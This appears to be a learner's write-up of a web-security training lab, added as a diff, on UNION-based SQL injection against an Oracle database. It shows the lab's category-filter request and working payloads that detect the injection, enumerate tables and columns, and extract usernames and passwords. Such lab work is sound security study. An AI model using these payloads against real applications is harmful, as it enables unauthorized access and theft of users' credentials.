@@ -1,0 +1,50 @@
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+
+There is a built-in table on Oracle called dual which you can use for this purpose. 
+For example: UNION SELECT 'abc' FROM dual
+
+On Oracle, you can find the same information as follows:
+
+You can list tables by querying all_tables:
+SELECT * FROM all_tables
+
+You can list columns by querying all_tab_columns:
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+
+------------------------------------------------------------------------
+
+org req :-
+
+GET /filter?category=Pets HTTP/2
+Host: 0a0200bf04afa52280577116006600a1.web-security-academy.net
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+
+------------------------------------------------------------------------
+
+sqli detection :- '+UNION+SELECT+'abc','efg'+FROM+dual--
+
+tables extraction :- '+UNION+SELECT+table_name,NULL+FROM+all_tables--
+
+column extraction :- '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_MBSMWI'--
+
+data extraction :- '+UNION+SELECT+USERNAME_CPZSWQ,PASSWORD_OALAFJ+FROM+USERS_MBSMWI--
+
+
+
